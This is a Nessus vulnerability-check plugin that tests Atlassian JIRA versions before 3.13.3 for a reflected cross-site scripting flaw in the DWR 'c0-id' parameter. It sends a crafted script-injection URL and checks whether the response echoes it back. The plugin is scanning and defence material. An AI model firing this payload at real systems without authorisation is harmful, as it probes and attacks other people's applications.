#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36184);
  script_version("$Revision: 1.3 $");

  script_bugtraq_id(34342);
  script_xref(name:"OSVDB", value:"53258");
  script_xref(name:"Secunia", value:"34556");

  script_name(english:"Atlassian JIRA < 3.13.3 DWR 'c0-id' XSS");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains an application that is affected by\n",
      "a cross-site scripting vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The remote host is running Atlassian JIRA, a web-based application\n",
      "for bug tracking, issue tracking, and project management.  The\n",
      "version installed on the remote web server is affected by a cross-\n",
      "site scripting issue due to a failure to sanitize input to the\n",
      "'c0-id' parameter during a DWR call.\n\n",
      "Note are other issues have been reported with JIRA versions < 3.13.3,\n",
      "although Nessus has not tested for them.  Refer to the advisory for\n",
      "more information."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://jira.atlassian.com/browse/CONF-11808"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://jira.atlassian.com/browse/JRA-16072"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2009-04-02"
  );
  script_set_attribute(
    attribute:"solution",
    value:string(
      "Either apply the patches referenced in the advisory above or upgrade\n",
      "to JIRA 3.13.3 or later."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_require_ports("Services/www", 80, 8080);
  script_dependencies("http_version.nasl");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);

#differences from default - encodes ', doesn't encode /?=&
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";
xss_warning = string(SCRIPT_NAME, "-", unixtime());
xss = 'dwr/exec/?callCount=1&c0-id=\');</script><script>alert("' + xss_warning + '");d(\'';
xss_encoded = urlencode(str:xss, unreserved:unreserved);
expected_output = '<script>alert("' + xss_warning + '");d(\'\', s0);\n</script>';

if (thorough_tests) dirs = list_uniq(make_list("/jira", "", "/secure", cgi_dirs()));
else dirs = cgi_dirs();

# Returns true if the XSS attack worked,
# false otherwise
function attempt_xss(dir)
{
  local_var res;

  res = http_send_recv3(
    port:port,
    method:"GET",
    item:dir + xss_encoded
  );
  if(isnull(res)) exit(0);

  if (expected_output >< res[2]) return TRUE;
  else return FALSE;
}

#
# Script execution starts here
#

foreach dir (dirs)
{
  dir += '/';

  if (attempt_xss(dir:dir))
  {
    report = string(
      "\nNessus was able to exploit the issue using the following URL :\n\n",
      "  ", build_url(port:port, qs:dir + xss_encoded), "\n"
    );

    if (report_verbosity > 0) security_warning(port:port, extra:report);
    else security_warning(port);

    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

    exit(0);
  }
}
